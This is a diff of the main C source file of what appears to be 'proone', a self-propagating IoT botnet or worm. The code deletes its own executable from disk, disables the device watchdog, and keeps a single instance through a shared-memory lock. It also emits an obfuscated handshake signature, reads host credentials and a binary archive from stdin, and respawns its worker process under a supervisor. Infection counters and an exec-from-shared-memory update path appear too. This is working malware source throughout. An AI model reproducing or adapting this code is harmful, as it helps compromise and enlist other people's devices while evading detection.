@@ -10,18 +10,22 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
+#include <malloc.h>
 #include <sys/stat.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <sys/file.h>
+#include <sys/wait.h>
+#include <sys/random.h>
 
 #include "proone.h"
-#include "util.h"
+#include "util_rt.h"
 #include "dvault.h"
 #include "heartbeat-worker.h"
 
 
-struct prne_global pne_g;
+struct prne_global prne_g;
+struct prne_shared_global *prne_s_g = NULL;
 
 
 typedef struct {
@@ -40,104 +44,10 @@ static void (*proc_fin_call_ptr)(void) = NULL;
 static bool finalising = false;
 static pollfd_pool_t pollfd_pool;
 
-
-static bool ensure_single_instance (void) {
-    int fd;
-
-    fd = shm_open(
-        prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL),
-        O_RDWR | O_CREAT | O_TRUNC,
-        0666);
-    prne_dvault_reset_dict();
-    if (fd < 0) {
-        return true;
-    }
-
-    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
-        return errno != EWOULDBLOCK;
-    }
-    else {
-        pne_g.has_proc_lim_lock = true;
-    }
-
-    return true;
-}
-
-static void init_rnd_engine (void) {
-    uint32_t seed = 0;
-    int fd;
-    prne_rnd_engnie_alloc_result_t ret;
-
-    fd = open("/dev/urandom", O_RDONLY);
-    if (fd >= 0) {
-        read(fd, &seed, sizeof(uint32_t));
-        close(fd);
-    } 
-
-    if (seed == 0) {
-        // fall back to seeding with what's available.
-        seed =
-            (uint32_t)(time(NULL) % 0xFFFFFFFF) ^
-            (uint32_t)(getpid() % 0xFFFFFFFF) ^
-            (uint32_t)(getppid() % 0xFFFFFFFF) ^
-            (uint32_t)(clock() % 0xFFFFFFFF);
-    }
-    
-    ret = prne_alloc_rnd_engine(seed == 0 ? NULL : &seed);
-    if (ret.result != PRNE_RND_ENGINE_ALLOC_OK) {
-        abort();
-    }
-
-    pne_g.rnd = ret.engine;
-}
-
-static void delete_myself (const char *arg0) {
-    static const char *proc_path = "/proc/self/exe";
-    struct stat st;
-    const char *path_to_unlink = NULL;
-    char *path_buf = NULL;    
-    
-    // get real path of myself
-    if (lstat(proc_path, &st) == 0 && (path_buf = (char*)malloc(st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size + 1) == st.st_size) {
-        path_buf[st.st_size] = 0;
-        path_to_unlink = path_buf;
-    }
-    else {
-        // try to delete arg0 instead
-        path_to_unlink = arg0;
-    }
-
-    unlink(path_to_unlink);
-    free(path_buf);
-}
-
-static void disasble_watchdog (void) {
-    static const char *watchdog_paths[] = {
-        "/dev/watchdog",
-        "/dev/misc/watchdog"
-    };
-    static const int one = 1;
-    int fd;
-    size_t i;
-
-    for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
-        if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
-            ioctl(fd, 0x80045704, &one);
-            close(fd);
-            break;
-        }
-    }
-}
-
-static void handle_interrupt (const int sig) {
-    if (pne_g.caught_signal == 0) {
-        pne_g.caught_signal = sig;
-    }
-    signal(sig, SIG_DFL);
-}
+static prne_rnd_engine_t *mk_rnd_engine (void);
 
 static void proc_fin_call (void) {
-    if (pne_g.caught_signal != 0) {
+    if (prne_g.caught_signal != 0) {
         size_t i;
         worker_tuple_t *wt;
 
@@ -151,104 +61,22 @@ static void proc_fin_call (void) {
     }
 }
 
-static void print_ready_signature (void) {
-    size_t len;
-    uint8_t *sig_data;
-    char *plain_str, *sig_str;
-    
-    plain_str = prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_SIGN_INIT_OK, &len);
-
-    sig_data = (uint8_t*)malloc(len + 1);
-    sig_data[0] = (uint8_t)(prne_rnd_gen_int(pne_g.rnd) % 256);
-    memcpy(sig_data + 1, plain_str, len);
-    prne_dvault_reset_dict();
-    prne_dvault_invert_mem(len, sig_data + 1, sig_data[0]);
-
-    sig_str = prne_enc_base64_mem(sig_data, len);
-    if (sig_str == NULL) {
-        abort();
-    }
-
-    puts(sig_str);
-
-    free(sig_str);
-    free(sig_data);
-}
-
-static void read_host_credential (void) {
-    static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3;
-    char *buf = (char*)malloc(buf_size);
-    size_t i;
-    bool found = false;
-
-    for (i = 0; i < buf_size; i += 1) {
-        if (read(STDIN_FILENO, &buf[i], 1) != 1) {
-            goto END;
-        }
-
-        if (buf[i] == '\n') {
-            found = true;
-            break;
-        }
-    }
-    if (found) {
-        prne_dec_base64_mem(buf, i, &pne_g.host_cred_data, &pne_g.host_cred_size);
-    }
-
-END:
-    free(buf);
-}
-
-
-int main (const int argc, char **args) {
+static int proone_main (void) {
     int exit_code = 0;
     size_t i;
     worker_tuple_t *wt;
     prne_worker_sched_info_t sched_info;
 
-    pne_g.host_cred_data = NULL;
-    pne_g.host_cred_size = 0;
-    pne_g.has_proc_lim_lock = false;
-    pne_g.bin_ready = false;
-    pne_g.caught_signal = 0;
-    pne_g.rnd = NULL;
-    prne_init_unpack_bin_archive_result(&pne_g.bin_pack);
-    prne_init_bin_archive(&pne_g.bin_archive);
-
-    /* quick prep. IN THIS ORDER! */
-    prne_init_dvault();
-#ifndef DEBUG
-    delete_myself(args[0]);
-    disasble_watchdog();
-#endif
-    init_rnd_engine();
-
-    print_ready_signature();
-    read_host_credential();
-    // get fed with the bin archive
-    pne_g.bin_pack = prne_unpack_bin_archive(STDIN_FILENO);
-    if (pne_g.bin_pack.result == PRNE_UNPACK_BIN_ARCHIVE_OK) {
-        pne_g.bin_ready = prne_index_bin_archive(&pne_g.bin_pack, &pne_g.bin_archive) == PRNE_INDEX_BIN_ARCHIVE_OK;
-    }
+    prne_g.rnd = mk_rnd_engine();
     
     // done with the terminal
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
 
-    // install signal handlers
-    // try to exit gracefully upon reception of these signals
-    signal(SIGINT, handle_interrupt);
-    signal(SIGTERM, handle_interrupt);
-    signal(SIGCHLD, SIG_IGN);
-#ifndef DEBUG
+#ifndef PRNE_DEBUG
     signal(SIGPIPE, SIG_IGN);
 #endif
-
-    if (!ensure_single_instance()) {
-        exit_code = 1;
-        goto END;
-    }
 
     // init workers
     if (prne_alloc_heartbeat_worker(&worker_pool[worker_pool_size].worker)) {
@@ -261,7 +89,7 @@ int main (const int argc, char **args) {
         prne_init_worker_sched_req(&worker_pool[i].sched_req, NULL);
     }
 
-    if (worker_pool_size == 0 || pne_g.caught_signal != 0) {
+    if (worker_pool_size == 0 || prne_g.caught_signal != 0) {
         goto END;
     }
 
@@ -324,7 +152,7 @@ int main (const int argc, char **args) {
             /* FIXME: `total_pollfd_size` could be zero if there's some bug in
             * one of the workers.
             */
-            ny_mem = realloc(pollfd_pool.arr, total_pollfd_size * sizeof(struct pollfd));
+            ny_mem = prne_realloc(pollfd_pool.arr, sizeof(struct pollfd), total_pollfd_size);
             if (ny_mem != NULL) {
                 pollfd_pool.arr = (struct pollfd*)ny_mem;
                 pollfd_pool.size = total_pollfd_size;
@@ -379,7 +207,7 @@ int main (const int argc, char **args) {
     }
 
 END:
-    free(pollfd_pool.arr);
+    prne_free(pollfd_pool.arr);
     pollfd_pool.arr = NULL;
     pollfd_pool.size = 0;
 
@@ -389,24 +217,435 @@ END:
         wt->sched_req.mem_func.free(&wt->sched_req);
     }
 
-    free(pne_g.host_cred_data);
-    pne_g.host_cred_data = NULL;
-    pne_g.host_cred_size = 0;
+    prne_free_rnd_engine(prne_g.rnd);
+    prne_g.rnd = NULL;
 
-    if (pne_g.has_proc_lim_lock) {
-        shm_unlink(prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL));
-        prne_dvault_reset_dict();
-        pne_g.has_proc_lim_lock = false;
+    return exit_code;
+}
+
+static bool ensure_single_instance (void) {
+    prne_g.lock_shm_fd = shm_open(
+        prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL),
+        O_RDWR | O_CREAT | O_TRUNC,
+        0666);
+    prne_dvault_reset_dict();
+    if (prne_g.lock_shm_fd < 0) {
+        return true;
     }
 
-    prne_free_bin_archive(&pne_g.bin_archive);
-    prne_free_unpack_bin_archive_result(&pne_g.bin_pack);
-    pne_g.bin_ready = false;
+    if (flock(prne_g.lock_shm_fd, LOCK_EX | LOCK_NB) < 0) {
+        close(prne_g.lock_shm_fd);
+        prne_g.lock_shm_fd = -1;
+
+        return false;
+    }
+
+    return true;
+}
+
+static void delete_myself (const char *arg0) {
+#ifndef PRNE_DEBUG
+    static const char *proc_path = "/proc/self/exe";
+    struct stat st;
+    const char *path_to_unlink = NULL;
+    char *path_buf = NULL;    
     
-    prne_free_rnd_engine(pne_g.rnd);
-    pne_g.rnd = NULL;
+    // get real path of myself
+    if (lstat(proc_path, &st) == 0 && (path_buf = (char*)prne_malloc(1, st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size) == st.st_size) {
+        path_buf[st.st_size] = 0;
+        path_to_unlink = path_buf;
+    }
+    else {
+        // try to delete arg0 instead
+        path_to_unlink = arg0;
+    }
+
+    unlink(path_to_unlink);
+    prne_free(path_buf);
+#endif
+}
+
+static void disasble_watchdog (void) {
+#ifndef PRNE_DEBUG
+    static const char *watchdog_paths[] = {
+        "/dev/watchdog",
+        "/dev/misc/watchdog"
+    };
+    static const int one = 1;
+    int fd;
+    size_t i;
+
+    for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
+        if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
+            ioctl(fd, 0x80045704, &one);
+            close(fd);
+            break;
+        }
+    }
+#endif
+}
+
+static void handle_interrupt (const int sig) {
+    prne_g.caught_signal = sig;
+
+    if (prne_g.proone_pid != 0) {
+        kill(prne_g.proone_pid, sig);
+    }
+}
+
+static void setup_signal_actions (void) {
+    struct sigaction sa;
+
+    sa.sa_handler = handle_interrupt;
+    sigemptyset(&sa.sa_mask);
+    sa.sa_flags = SA_RESETHAND;
+
+    // try to exit gracefully upon reception of these signals
+    sigaction(SIGINT, &sa, NULL);
+    sigaction(SIGTERM, &sa, NULL);
+}
+
+static void print_ready_signature (prne_rnd_engine_t *rnd) {
+    size_t len;
+    uint8_t *sig_data;
+    char *plain_str, *sig_str;
+    
+    plain_str = prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_SIGN_INIT_OK, &len);
+
+    sig_data = (uint8_t*)prne_malloc(1, len + 1);
+    sig_data[0] = (uint8_t)(prne_rnd_gen_int(rnd) % 256);
+    memcpy(sig_data + 1, plain_str, len);
+    prne_dvault_reset_dict();
+    prne_dvault_invert_mem(len, sig_data + 1, sig_data[0]);
+
+    sig_str = prne_enc_base64_mem(sig_data, len);
+    if (sig_str == NULL) {
+        abort();
+    }
+
+    puts(sig_str);
+
+    prne_free(sig_str);
+    prne_free(sig_data);
+}
+
+static void read_host_credential (void) {
+    static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3;
+    char *buf = (char*)prne_malloc(1, buf_size);
+    size_t i;
+    bool found = false;
+
+    for (i = 0; i < buf_size; i += 1) {
+        if (read(STDIN_FILENO, &buf[i], 1) != 1) {
+            goto END;
+        }
+
+        if (buf[i] == '\n') {
+            found = true;
+            break;
+        }
+    }
+    if (found) {
+        prne_dec_base64_mem(buf, i, &prne_g.host_cred_data, &prne_g.host_cred_size);
+    }
+
+END:
+    prne_free(buf);
+}
+
+static void set_env (void) {
+#ifdef PRNE_DEBUG
+    // print info on heap corruption as much as possible
+    mallopt(M_CHECK_ACTION, 3);
+#else
+    // silently die on heap corruption
+    mallopt(M_CHECK_ACTION, 2);
+#endif
+}
+
+static void create_ny_bin_shm (prne_rnd_engine_t *rnd) {
+    const size_t str_len = 1 + 10;
+
+    prne_g.ny_bin_shm_name = prne_malloc(1, str_len + 1);
+    if (prne_g.ny_bin_shm_name == NULL) {
+        return;
+    }
+
+    prne_g.ny_bin_shm_name[0] = '/';
+    prne_g.ny_bin_shm_name[str_len] = 0;
+    prne_rnd_anum_str(rnd, prne_g.ny_bin_shm_name + 1, str_len - 1);
+    
+    prne_g.ny_bin_shm_fd = shm_open(prne_g.ny_bin_shm_name, O_RDWR | O_CREAT | O_TRUNC, 0000);
+    if (prne_g.ny_bin_shm_fd < 0) {
+        prne_free(prne_g.ny_bin_shm_name);
+        prne_g.ny_bin_shm_name = NULL;
+    }
+}
+
+static void exec_ny_bin (void) {
+    // Just die on error
+    static const size_t proc_fd_path_size = 14 + 11 + 1;
+    uint8_t *data, *bin = NULL;
+    size_t i, args_size, bin_size, argc = 0, cnt;
+    char *arg_str;
+    const char **args;
+    struct stat st;
+    char *proc_fd_path;
+    char *real_shm_path;
+
+    if (prne_g.ny_bin_shm_fd < 0) {
+        return;
+    }
+
+    if (fstat(prne_g.ny_bin_shm_fd, &st) < 0 || st.st_size < 0) {
+        abort();
+    }
+    if (st.st_size == 0) {
+        if (prne_s_g->has_ny_bin) {
+            abort();
+        }
+        return;
+    }
+    data = (uint8_t*)mmap(NULL, (size_t)st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, prne_g.ny_bin_shm_fd, 0);
+    for (i = 1; i <= (size_t)st.st_size; i += 1) {
+        if (data[st.st_size - i] == 0) {
+            bin = &data[st.st_size - i + 1];
+            break;
+        }
+    }
+
+    if (bin == NULL) {
+        abort();
+    }
+    args_size = bin - data;
+    bin_size = st.st_size - args_size;
+    arg_str = prne_malloc(1, args_size);
+    memcpy(arg_str, data, args_size);
+
+    memmove(bin, data, bin_size);
+
+    munmap(data, (size_t)st.st_size);
+    data = NULL;
+    ftruncate(prne_g.ny_bin_shm_fd, bin_size);
+
+    for (i = 0; i < args_size; i += 1) {
+        if (arg_str[i] == 0) {
+            argc += 1;
+        }
+    }
+    args = prne_malloc(sizeof(const char*), argc + 1);
+    cnt = 1;
+    for(i = 1; cnt < argc; i += 1) {
+        if (arg_str[i] == 0) {
+            args[cnt] = &arg_str[i + 1];
+            cnt += 1;
+        }
+    }
+    args[argc] = NULL;
+
+    proc_fd_path = prne_malloc(1, proc_fd_path_size);
+    snprintf(proc_fd_path, proc_fd_path_size, "/proc/self/fd/%d", prne_g.ny_bin_shm_fd);
+    if (lstat(proc_fd_path, &st) < 0) {
+        abort();
+    }
+
+    real_shm_path = prne_malloc(1, st.st_size + 1);
+    if (readlink(proc_fd_path, real_shm_path, st.st_size) != st.st_size) {
+        abort();
+    }
+    
+    fchmod(prne_g.ny_bin_shm_fd, 0777);
+    close(prne_g.ny_bin_shm_fd);
+    prne_g.ny_bin_shm_fd = -1;
+
+    args[0] = proc_fd_path;
+    if (execv(real_shm_path, (char *const*)args) < 0) {
+        abort();
+    }
+}
+
+static void init_shared_global (prne_rnd_engine_t *rnd) {
+    // just die on error
+    const size_t str_len = 1 + 10;
+    int fd;
+    char *name;
+
+    name = prne_malloc(1, str_len + 1);
+    name[0] = '/';
+    name[str_len] = 0;
+    prne_rnd_anum_str(rnd, name + 1, str_len - 1);
+    
+    fd = shm_open(name, O_RDWR | O_CREAT | O_TRUNC, 0000);
+    if (fd < 0) {
+        abort();
+    }
+    shm_unlink(name);
+    prne_free(name);
+
+    if (ftruncate(fd, sizeof(struct prne_shared_global)) < 0) {
+        abort();
+    }
+    prne_s_g = (struct prne_shared_global*)mmap(NULL, sizeof(struct prne_shared_global), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (prne_s_g == NULL) {
+        abort();
+    }
+    close(fd);
+
+    prne_s_g->bne_cnt = 0;
+    prne_s_g->infect_cnt = 0;
+    prne_s_g->has_ny_bin = false;    
+}
+
+
+int main (const int argc, char **args) {
+    int exit_code = 0;
+    prne_rnd_engine_t *rnd = NULL;
+
+    // inits that need no outside resources
+    set_env();
+    prne_init_dvault();
+
+    prne_g.host_cred_data = NULL;
+    prne_g.host_cred_size = 0;
+    prne_g.ny_bin_shm_name = NULL;
+    prne_g.rnd = NULL;
+    memset(&prne_g.god_start, 0, sizeof(struct timespec));
+    prne_g.run_cnt = 0;
+    prne_g.caught_signal = 0;
+    prne_g.god_pid = getpid();
+    prne_g.proone_pid = 0;
+    prne_g.lock_shm_fd = -1;
+    prne_g.ny_bin_shm_fd = -1;
+    prne_g.bin_ready = false;
+    prne_init_unpack_bin_archive_result(&prne_g.bin_pack);
+    prne_init_bin_archive(&prne_g.bin_archive);
+
+    /* inits that need outside resources. IN THIS ORDER! */
+    if (!ensure_single_instance()) {
+        exit_code = 1;
+        goto END;
+    }
+    rnd = mk_rnd_engine();
+    init_shared_global(rnd);
+    create_ny_bin_shm(rnd);
+    delete_myself(args[0]);
+    disasble_watchdog();
+
+    print_ready_signature(rnd);
+    read_host_credential();
+    // get fed with the bin archive
+    prne_g.bin_pack = prne_unpack_bin_archive(STDIN_FILENO);
+    if (prne_g.bin_pack.result == PRNE_UNPACK_BIN_ARCHIVE_OK) {
+        prne_g.bin_ready = prne_index_bin_archive(&prne_g.bin_pack, &prne_g.bin_archive) == PRNE_INDEX_BIN_ARCHIVE_OK;
+    }
+
+    setup_signal_actions();
+
+    prne_succeed_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.god_start));
+
+    // main loop
+    while (prne_g.caught_signal == 0) {
+        prne_g.proone_pid = fork();
+
+        if (prne_g.proone_pid >= 0) {
+            prne_g.run_cnt += 1;
+        }
+
+        if (prne_g.proone_pid < 0) {
+            sleep(1);
+        }
+        else if (prne_g.proone_pid > 0) {
+            int status;
+
+            while (prne_g.caught_signal == 0) {
+                if (waitpid(prne_g.proone_pid, &status, 0) < 0) {
+                    if (errno != EINTR) {
+                        abort();
+                    }
+                    else {
+                        continue;
+                    }
+                }
+
+                prne_g.proone_pid = 0;
+                break;
+            }
+
+            if (!WIFEXITED(status)) {
+                sleep(3);
+                continue;
+            }
+            if (WEXITSTATUS(status) == 0) {
+                break;
+            }
+        }
+        else {
+            prne_free(prne_g.ny_bin_shm_name);
+            close(prne_g.lock_shm_fd);
+            prne_g.lock_shm_fd = -1;
+            prne_g.ny_bin_shm_name = NULL;
+        
+            exit_code = proone_main();
+            break;
+        }
+    }
+
+END:
+    prne_free_bin_archive(&prne_g.bin_archive);
+    prne_free_unpack_bin_archive_result(&prne_g.bin_pack);
+    prne_g.bin_ready = false;
+
+    prne_free(prne_g.host_cred_data);
+    prne_g.host_cred_data = NULL;
+    prne_g.host_cred_size = 0;
+
+    if (prne_g.lock_shm_fd >= 0) {
+        shm_unlink(prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL));
+        prne_dvault_reset_dict();
+        close(prne_g.lock_shm_fd);
+        prne_g.lock_shm_fd = -1;
+    }
 
     prne_deinit_dvault();
 
+    prne_free_rnd_engine(rnd);
+    rnd = NULL;
+
+
+    if (prne_s_g->has_ny_bin) {
+        exec_ny_bin();
+    }
+    
+    if (prne_g.ny_bin_shm_name != NULL) {
+        shm_unlink(prne_g.ny_bin_shm_name);
+        prne_free(prne_g.ny_bin_shm_name);
+    }
+    close(prne_g.ny_bin_shm_fd);
+    prne_g.ny_bin_shm_name = NULL;
+    prne_g.ny_bin_shm_fd = -1;
+
     return exit_code;
+}
+
+static prne_rnd_engine_t *mk_rnd_engine (void) {
+    uint32_t seed = 0;
+    prne_rnd_engnie_alloc_result_t ret;
+
+    getrandom(&seed, sizeof(uint32_t), 0);
+
+    if (seed == 0) {
+        // fall back to seeding with what's available.
+        seed =
+            (uint32_t)(time(NULL) % 0xFFFFFFFF) ^
+            (uint32_t)(getpid() % 0xFFFFFFFF) ^
+            (uint32_t)(getppid() % 0xFFFFFFFF) ^
+            (uint32_t)(clock() % 0xFFFFFFFF);
+    }
+    
+    ret = prne_alloc_rnd_engine(seed == 0 ? NULL : &seed);
+    if (ret.result != PRNE_RND_ENGINE_ALLOC_OK) {
+        abort();
+    }
+
+    return ret.engine;
 }
